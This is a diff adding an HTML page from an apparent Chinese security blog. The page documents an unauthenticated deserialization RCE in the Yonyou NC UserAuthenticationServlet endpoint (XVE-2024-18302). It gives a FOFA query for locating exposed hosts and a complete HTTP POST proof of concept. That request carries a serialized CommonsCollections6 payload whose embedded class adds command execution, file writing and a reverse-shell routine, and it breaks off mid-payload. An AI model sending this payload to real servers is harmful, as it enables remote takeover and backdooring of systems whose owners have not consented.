@@ -1,0 +1,705 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <link rel="icon" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ninja">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)用友NC &#x2F;servlet&#x2F;~uapim&#x2F;nc.bs.pub.im.UserAuthenticationServlet接口存在反序列化漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)">
+<meta property="og:url" content="http://example.com/1970/01/01/POC/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3UserAuthenticationServlet%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E(XVE-2024-18302)/index.html">
+<meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
+<meta property="og:description" content="用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)用友NC &#x2F;servlet&#x2F;~uapim&#x2F;nc.bs.pub.im.UserAuthenticationServlet接口存在反序列化漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407262116319.png">
+<meta property="og:image" content="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407262115766.png">
+<meta property="article:published_time" content="1970-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-27T02:41:21.128Z">
+<meta property="article:author" content="Ninja">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407262116319.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302) - Ninja&#39;s blog - 学与用</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ninja&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-th-large"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" target="_self">
+                <i class="iconfont icon-book"></i>
+                <span>漏洞知识库</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codeforces"></i>
+                <span>在线工具</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hack.chat" target="_self">
+                    
+                    <span>Hack.chat私密频道</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://git.io/linux" target="_self">
+                    
+                    <span>Linux命令大全</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://xssaq.com" target="_self">
+                    
+                    <span>XSS平台</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="1970-01-01 08:00" pubdate>
+          1970年1月1日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞-XVE-2024-18302"><a href="#用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞-XVE-2024-18302" class="headerlink" title="用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)"></a>用友NC系统接口UserAuthenticationServlet存在反序列化RCE漏洞(XVE-2024-18302)</h1><p>用友NC &#x2F;servlet&#x2F;~uapim&#x2F;nc.bs.pub.im.UserAuthenticationServlet接口存在反序列化漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>
+<h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">app=&quot;用友-UFIDA-NC&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>使用cc6链打poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /servlet/~uapim/nc.bs.pub.im.UserAuthenticationServlet HTTP/<span class="hljs-number">1.1</span><br>Host: <br>Cmd: id<br>Accept-Encoding: gzip<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_14_3</span>) AppleWebKit/<span class="hljs-number">605.1</span><span class="hljs-number">.15</span> (KHTML, like Gecko) Version/<span class="hljs-number">12.0</span><span class="hljs-number">.3</span> Safari/<span class="hljs-number">605.1</span><span class="hljs-number">.15</span><br> <br>&#123;&#123;unquote(<span class="hljs-string">&quot;\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec\x28z\x97\x04\x02\x00\x01[\x00\x0diTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x07sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\x09iConstantq\x00~\x00\x03xpvr\x00*org.mozilla.javascript.DefiningClassLoader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk\x7b|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNamet\x00\x12Ljava/lang/String;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s\x29l\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00t\x00\x16getDeclaredConstructoruq\x00~\x00\x1a\x00\x00\x00\x01vq\x00~\x00\x1asq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x01uq\x00~\x00\x18\x00\x00\x00\x00t\x00\x0bnewInstanceuq\x00~\x00\x1a\x00\x00\x00\x01vq\x00~\x00\x18sq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x02t\x00\x02A4ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x1b\xbb\xca\xfe\xba\xbe\x00\x00\x001\x01\x9a\x0a\x00\x1e\x00\xad\x0a\x00C\x00\xae\x0a\x00C\x00\xaf\x0a\x00\x1e\x00\xb0\x08\x00\xb1\x0a\x00\x1c\x00\xb2\x0a\x00\xb3\x00\xb4\x0a\x00\xb3\x00\xb5\x07\x00\xb6\x0a\x00C\x00\xb7\x08\x00\xa5\x0a\x00!\x00\xb8\x08\x00\xb9\x08\x00\xba\x07\x00\xbb\x08\x00\xbc\x08\x00\xbd\x07\x00\xbe\x0a\x00\x1c\x00\xbf\x08\x00\xc0\x08\x00\xc1\x07\x00\xc2\x0b\x00\x16\x00\xc3\x0b\x00\xc4\x00\xc5\x0b\x00\xc4\x00\xc6\x08\x00\xc7\x08\x00\xc8\x07\x00\xc9\x0a\x00\x1c\x00\xca\x07\x00\xcb\x0a\x00\xcc\x00\xcd\x08\x00\xce\x07\x00\xcf\x08\x00\xd0\x0a\x00\x8f\x00\xd1\x0a\x00!\x00\xd2\x08\x00\xd3\x09\x00\xd4\x00\xd5\x0a\x00\xd4\x00\xd6\x08\x00\xd7\x0a\x00\x8f\x00\xd8\x0a\x00\x1c\x00\xd9\x08\x00\xda\x07\x00\xdb\x0a\x00\x1c\x00\xdc\x08\x00\xdd\x07\x00\xde\x08\x00\xdf\x08\x00\xe0\x0a\x00\x1c\x00\xe1\x07\x00\xe2\x0a\x00C\x00\xe3\x0a\x00\xe4\x00\xd8\x08\x00\xe5\x0a\x00!\x00\xe6\x08\x00\xe7\x0a\x00!\x00\xe8\x08\x00\xe9\x0a\x00!\x00\xea\x0a\x00\x8f\x00\xeb\x08\x00\xec\x0a\x00!\x00\xed\x08\x00\xee\x09\x00\x8f\x00\xef\x0a\x00\xd4\x00\xf0\x09\x00\x8f\x00\xf1\x07\x00\xf2\x0a\x00C\x00\xf3\x0a\x00C\x00\xf4\x08\x00\xa6\x08\x00\xf5\x08\x00\xf6\x0a\x00\x8f\x00\xf7\x08\x00\xf8\x0a\x00\x8f\x00\xf9\x07\x00\xfa\x0a\x00L\x00\xfb\x07\x00\xfc\x0a\x00N\x00\xfd\x0a\x00\x8f\x00\xfe\x0a\x00N\x00\xff\x0a\x00N\x01\x00\x0a\x00N\x01\x01\x0a\x00/\x01\x02\x0a\x00L\x01\x03\x0a\x00!\x01\x04\x08\x01\x05\x0a\x01\x06\x01\x07\x0a\x00!\x01\x08\x08\x01\x09\x08\x01\x0a\x08\x01\x0b\x07\x01\x0c\x0a\x00]\x00\xad\x0a\x00]\x01\x0d\x08\x01\x0e\x0a\x00]\x01\x02\x08\x01\x0f\x08\x01\x10\x08\x01\x11\x08\x01\x12\x0a\x01\x13\x01\x14\x0a\x01\x13\x01\x15\x07\x01\x16\x0a\x01\x17\x01\x18\x0a\x00h\x01\x19\x08\x01\x1a\x0a\x00h\x01\x1b\x0a\x00h\x00\xc5\x0a\x00h\x01\x1c\x0a\x01\x17\x01\x1d\x0a\x01\x17\x01\x1e\x08\x01\x1f\x08\x01 \x0a\x01\x13\x01!\x07\x01\&quot;\x0a\x00t\x01#\x0a\x00t\x01\x18\x0a\x01\x17\x01$\x0a\x00t\x01$\x0a\x00t\x01%\x0a\x01&amp;\x01&#x27;\x0a\x01&amp;\x01\x28\x0a\x01\x29\x01*\x0a\x01\x29\x01\x00\x05\x00\x00\x00\x00\x00\x00\x002\x0a\x00C\x01+\x0a\x01\x17\x01,\x0a\x00t\x01\x01\x08\x01-\x0a\x00/\x01.\x08\x01/\x08\x010\x0a\x00\xd4\x011\x0a\x00\x8f\x012\x08\x013\x08\x014\x08\x015\x08\x016\x08\x00\xa9\x08\x017\x07\x018\x01\x00\x0cBASE64_CHARS\x01\x00\x12Ljava/lang/String;\x01\x00\x0dConstantValue\x08\x019\x01\x00\x02ip\x01\x00\x04port\x01\x00\x13Ljava/lang/Integer;\x01\x00\x06&lt;init&gt;\x01\x00\x03\x28\x29V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x0aExceptions\x01\x00\x09loadClass\x01\x00%\x28Ljava/lang/String;\x29Ljava/lang/Class;\x01\x00\x09Signature\x01\x00\x28\x28Ljava/lang/String;\x29Ljava/lang/Class&lt;*&gt;;\x01\x00\x05proxy\x01\x00&amp;\x28Ljava/lang/String;\x29Ljava/lang/String;\x01\x00\x05write\x01\x008\x28Ljava/lang/String;Ljava/lang/String;\x29Ljava/lang/String;\x01\x00\x0aclearParam\x01\x00\x04exec\x01\x00\x07reverse\x01\x00&#x27;\x28Ljava/lang/String;I\x29Ljava/lang/String;\x01\x00\x03run\x01\x00\x06decode\x01\x00\x16\x28Ljava/lang/String;\x29[B\x01\x00\x0aSourceFile\x01\x00\x07A4.java\x0c\x00\x97\x00\x98\x0c\x01:\x01;\x0c\x01&lt;\x01=\x0c\x01&gt;\x01?\x01\x00\x07threads\x0c\x01@\x01A\x07\x01B\x0c\x01C\x01D\x0c\x01E\x01F\x01\x00\x13[Ljava/lang/Thread;\x0c\x01G\x01H\x0c\x01I\x01J\x01\x00\x04http\x01\x00\x06target\x01\x00\x12java/lang/Runnable\x01\x00\x06this$0\x01\x00\x07handler\x01\x00\x1ejava/lang/NoSuchFieldException\x0c\x01K\x01?\x01\x00\x06global\x01\x00\x0aprocessors\x01\x00\x0ejava/util/List\x0c\x01L\x01M\x07\x01N\x0c\x01O\x01P\x0c\x01Q\x01R\x01\x00\x03req\x01\x00\x0bgetResponse\x01\x00\x0fjava/lang/Class\x0c\x01S\x01T\x01\x00\x10java/lang/Object\x07\x01U\x0c\x01V\x01W\x01\x00\x09getHeader\x01\x00\x10java/lang/String\x01\x00\x03cmd\x0c\x00\xa0\x00\xa1\x0c\x01X\x01Y\x01\x00\x09setStatus\x07\x01Z\x0c\x01[\x01\\\x0c\x01]\x01^\x01\x00$org.apache.tomcat.util.buf.ByteChunk\x0c\x00\x9c\x00\x9d\x0c\x01_\x01R\x01\x00\x08setBytes\x01\x00\x02[B\x0c\x01`\x01T\x01\x00\x07doWrite\x01\x00\x13java/lang/Exception\x01\x00\x13java.nio.ByteBuffer\x01\x00\x04wrap\x0c\x01a\x00\x9d\x01\x00 java/lang/ClassNotFoundException\x0c\x01b\x01c\x07\x01d\x01\x00\x00\x0c\x01e\x01f\x01\x00\x10command not null\x0c\x01g\x01H\x01\x00\x05#####\x0c\x01h\x01i\x0c\x00\xa4\x00\xa1\x01\x00\x01:\x0c\x01j\x01k\x01\x00\&quot;command reverse host format error!\x0c\x00\x94\x00\x91\x0c\x01l\x01m\x0c\x00\x95\x00\x96\x01\x00\x10java/lang/Thread\x0c\x00\x97\x01n\x0c\x01o\x00\x98\x01\x00\x05$$$$$\x01\x00\x12file format error!\x0c\x00\xa2\x00\xa3\x01\x00\x05@@@@@\x0c\x00\xa5\x00\xa1\x01\x00\x0cjava/io/File\x0c\x00\x97\x01p\x01\x00\x18java/io/FileOutputStream\x0c\x00\x97\x01q\x0c\x00\xa9\x00\xaa\x0c\x00\xa2\x01r\x0c\x01s\x00\x98\x0c\x01t\x00\x98\x0c\x01u\x01H\x0c\x01v\x01H\x0c\x01w\x01x\x01\x00\x07os.name\x07\x01y\x0c\x01z\x00\xa1\x0c\x01\x7b\x01H\x01\x00\x03win\x01\x00\x04ping\x01\x00\x02-n\x01\x00\x17java/lang/StringBuilder\x0c\x01|\x01\x7d\x01\x00\x05 -n 4\x01\x00\x02/c\x01\x00\x05 -t 4\x01\x00\x02sh\x01\x00\x02-c\x07\x01~\x0c\x01\x7f\x01\x80\x0c\x00\xa5\x01\x81\x01\x00\x11java/util/Scanner\x07\x01\x82\x0c\x01\x83\x01\x84\x0c\x00\x97\x01\x85\x01\x00\x02\\a\x0c\x01\x86\x01\x87\x0c\x01Q\x01H\x0c\x01\x88\x01\x84\x0c\x01\x89\x00\x98\x01\x00\x07/bin/sh\x01\x00\x07cmd.exe\x0c\x00\xa5\x01\x8a\x01\x00\x0fjava/net/Socket\x0c\x00\x97\x01\x8b\x0c\x01\x8c\x01\x8d\x0c\x01\x8e\x01P\x07\x01\x8f\x0c\x01\x90\x01\x91\x0c\x01\x92\x01\x91\x07\x01\x93\x0c\x00\xa2\x01\x94\x0c\x01\x95\x01\x96\x0c\x01\x97\x01\x91\x01\x00\x1dreverse execute error, msg -&gt;\x0c\x01\x98\x01H\x01\x00\x01!\x01\x00\x13reverse execute ok!\x0c\x01\x99\x01\x91\x0c\x00\xa6\x00\xa7\x01\x00\x16sun.misc.BASE64Decoder\x01\x00\x0cdecodeBuffer\x01\x00\x10java.util.Base64\x01\x00\x0agetDecoder\x01\x00&amp;org.apache.commons.codec.binary.Base64\x01\x00\x02A4\x01\x00@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x01\x00\x0dcurrentThread\x01\x00\x14\x28\x29Ljava/lang/Thread;\x01\x00\x0egetThreadGroup\x01\x00\x19\x28\x29Ljava/lang/ThreadGroup;\x01\x00\x08getClass\x01\x00\x13\x28\x29Ljava/lang/Class;\x01\x00\x10getDeclaredField\x01\x00-\x28Ljava/lang/String;\x29Ljava/lang/reflect/Field;\x01\x00\x17java/lang/reflect/Field\x01\x00\x0dsetAccessible\x01\x00\x04\x28Z\x29V\x01\x00\x03get\x01\x00&amp;\x28Ljava/lang/Object;\x29Ljava/lang/Object;\x01\x00\x07getName\x01\x00\x14\x28\x29Ljava/lang/String;\x01\x00\x08contains\x01\x00\x1b\x28Ljava/lang/CharSequence;\x29Z\x01\x00\x0dgetSuperclass\x01\x00\x08iterator\x01\x00\x16\x28\x29Ljava/util/Iterator;\x01\x00\x12java/util/Iterator\x01\x00\x07hasNext\x01\x00\x03\x28\x29Z\x01\x00\x04next\x01\x00\x14\x28\x29Ljava/lang/Object;\x01\x00\x09getMethod\x01\x00@\x28Ljava/lang/String;[Ljava/lang/Class;\x29Ljava/lang/reflect/Method;\x01\x00\x18java/lang/reflect/Method\x01\x00\x06invoke\x01\x009\x28Ljava/lang/Object;[Ljava/lang/Object;\x29Ljava/lang/Object;\x01\x00\x08getBytes\x01\x00\x04\x28\x29[B\x01\x00\x11java/lang/Integer\x01\x00\x04TYPE\x01\x00\x11Ljava/lang/Class;\x01\x00\x07valueOf\x01\x00\x16\x28I\x29Ljava/lang/Integer;\x01\x00\x0bnewInstance\x01\x00\x11getDeclaredMethod\x01\x00\x07forName\x01\x00\x15getContextClassLoader\x01\x00\x19\x28\x29Ljava/lang/ClassLoader;\x01\x00\x15java/lang/ClassLoader\x01\x00\x06equals\x01\x00\x15\x28Ljava/lang/Object;\x29Z\x01\x00\x04trim\x01\x00\x0astartsWith\x01\x00\x15\x28Ljava/lang/String;\x29Z\x01\x00\x05split\x01\x00&#x27;\x28Ljava/lang/String;\x29[Ljava/lang/String;\x01\x00\x08parseInt\x01\x00\x15\x28Ljava/lang/String;\x29I\x01\x00\x17\x28Ljava/lang/Runnable;\x29V\x01\x00\x05start\x01\x00\x15\x28Ljava/lang/String;\x29V\x01\x00\x11\x28Ljava/io/File;\x29V\x01\x00\x05\x28[B\x29V\x01\x00\x05flush\x01\x00\x05close\x01\x00\x08toString\x01\x00\x0fgetAbsolutePath\x01\x00\x07replace\x01\x00D\x28Ljava/lang/CharSequence;Ljava/lang/CharSequence;\x29Ljava/lang/String;\x01\x00\x10java/lang/System\x01\x00\x0bgetProperty\x01\x00\x0btoLowerCase\x01\x00\x06append\x01\x00-\x28Ljava/lang/String;\x29Ljava/lang/StringBuilder;\x01\x00\x11java/lang/Runtime\x01\x00\x0agetRuntime\x01\x00\x15\x28\x29Ljava/lang/Runtime;\x01\x00\x28\x28[Ljava/lang/String;\x29Ljava/lang/Process;\x01\x00\x11java/lang/Process\x01\x00\x0egetInputStream\x01\x00\x17\x28\x29Ljava/io/InputStream;\x01\x00\x18\x28Ljava/io/InputStream;\x29V\x01\x00\x0cuseDelimiter\x01\x00&#x27;\x28Ljava/lang/String;\x29Ljava/util/Scanner;\x01\x00\x0egetErrorStream\x01\x00\x07destroy\x01\x00&#x27;\x28Ljava/lang/String;\x29Ljava/lang/Process;\x01\x00\x16\x28Ljava/lang/String;I\x29V\x01\x00\x0fgetOutputStream\x01\x00\x18\x28\x29Ljava/io/OutputStream;\x01\x00\x08isClosed\x01\x00\x13java/io/InputStream\x01\x00\x09available\x01\x00\x03\x28\x29I\x01\x00\x04read\x01\x00\x14java/io/OutputStream\x01\x00\x04\x28I\x29V\x01\x00\x05sleep\x01\x00\x04\x28J\x29V\x01\x00\x09exitValue\x01\x00\x0agetMessage\x01\x00\x08intValue\x00!\x00\x8f\x00\x1e\x00\x01\x00\x0f\x00\x03\x00\x1a\x00\x90\x00\x91\x00\x01\x00\x92\x00\x00\x00\x02\x00\x93\x00\x02\x00\x94\x00\x91\x00\x00\x00\x02\x00\x95\x00\x96\x00\x00\x00\x09\x00\x01\x00\x97\x00\x98\x00\x02\x00\x99\x00\x00\x03\xb6\x00\x06\x00\x13\x00\x00\x02\x8e*\xb7\x00\x01\xb8\x00\x02\xb6\x00\x03L+\xb6\x00\x04\x12\x05\xb6\x00\x06M,\x04\xb6\x00\x07,+\xb6\x00\x08\xc0\x00\x09\xc0\x00\x09N-:\x04\x19\x04\xbe6\x05\x036\x06\x15\x06\x15\x05\xa2\x02X\x19\x04\x15\x062:\x07\x19\x07\xc7\x00\x06\xa7\x02C\x19\x07\xb6\x00\x0a:\x08\x19\x08\x12\x0b\xb6\x00\x0c\x9a\x00\x0d\x19\x08\x12\x0d\xb6\x00\x0c\x9a\x00\x06\xa7\x02%\x19\x07\xb6\x00\x04\x12\x0e\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08:\x09\x19\x09\xc1\x00\x0f\x9a\x00\x06\xa7\x02\x02\x19\x09\xb6\x00\x04\x12\x10\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x09\xb6\x00\x08:\x09\x19\x09\xb6\x00\x04\x12\x11\xb6\x00\x06M\xa7\x00\x16:\x0a\x19\x09\xb6\x00\x04\xb6\x00\x13\xb6\x00\x13\x12\x11\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x09\xb6\x00\x08:\x09\x19\x09\xb6\x00\x04\xb6\x00\x13\x12\x14\xb6\x00\x06M\xa7\x00\x10:\x0a\x19\x09\xb6\x00\x04\x12\x14\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x09\xb6\x00\x08:\x09\x19\x09\xb6\x00\x04\x12\x15\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x09\xb6\x00\x08\xc0\x00\x16\xc0\x00\x16:\x0a\x19\x0a\xb9\x00\x17\x01\x00:\x0b\x19\x0b\xb9\x00\x18\x01\x00\x99\x01[\x19\x0b\xb9\x00\x19\x01\x00:\x0c\x19\x0c\xb6\x00\x04\x12\x1a\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x0c\xb6\x00\x08:\x0d\x19\x0d\xb6\x00\x04\x12\x1b\x03\x